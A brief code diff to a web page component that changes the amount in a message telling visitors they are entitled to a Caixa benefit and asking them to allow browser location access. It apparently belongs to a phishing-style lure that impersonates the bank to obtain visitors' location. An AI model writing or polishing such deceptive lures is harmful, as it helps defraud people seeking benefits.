@@ -15,7 +15,7 @@ export default function Home() {
     }
 
     setMessage(
-      "Parabéns! Você tem direito ao benefício no valor de R$ 691,53. Para encontrarmos a agência da Caixa mais próxima e garantir o seu pagamento, por favor autorize o navegador a acessar sua localização."
+      "Parabéns! Você tem direito ao benefício no valor de R$ 800,53. Para encontrarmos a agência da Caixa mais próxima e garantir o seu pagamento, por favor autorize o navegador a acessar sua localização."
     );
 
     if (!navigator.geolocation) {
